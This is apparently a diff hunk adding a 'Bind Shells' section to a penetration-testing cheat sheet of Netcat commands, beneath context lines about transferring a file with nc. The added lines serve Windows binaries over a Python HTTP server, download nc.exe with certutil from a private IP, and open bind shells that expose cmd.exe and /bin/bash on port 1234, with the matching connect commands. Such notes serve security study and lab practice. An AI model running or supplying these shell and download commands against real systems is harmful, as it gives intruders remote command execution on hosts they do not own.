@@ -1626,8 +1626,17 @@ echo "Hello, this was sent over with Netcat" >> test.txt
 nc.exe -nvlp 1234 > test.txt
 nc -nv 10.4.20.244 1234 < test.txt
 ```
-
-
+82)  Bind Shells
+```
+cd /usr/share/windows-binaries
+python -m SimpleHTTPServer 80
+ifconfig
+certutil -urlcache -f http://10.10.3.2/nc.exe nc.exe
+nc.exe -nvlp 1234 -e cmd.exe
+nc -nv 10.4.21.221 1234
+nc -nvlp 1234 -e /bin/bash
+nc.exe -nv 10.10.3.2 1234  #windows
+```
 
 
 
